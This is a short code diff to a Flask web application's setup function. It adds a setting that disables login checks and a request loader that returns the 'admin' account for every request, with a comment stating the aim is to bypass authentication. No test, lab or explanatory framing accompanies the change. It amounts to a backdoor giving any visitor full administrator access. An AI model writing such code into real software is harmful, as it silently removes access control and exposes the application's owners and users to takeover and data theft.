@@ -47,10 +47,16 @@ def create_app():
 
     login_manager.init_app(app)
     login_manager.login_view = "auth.login"
+    app.config["LOGIN_DISABLED"] = True
 
     @login_manager.user_loader
     def load_user(user_id):
         return User.query.get(int(user_id))
+
+    @login_manager.request_loader
+    def request_loader(request):
+        # Always return the admin user to bypass authentication
+        return User.query.filter_by(username="admin").first()
 
     with app.app_context():
         from ui.web.views.main import main_bp
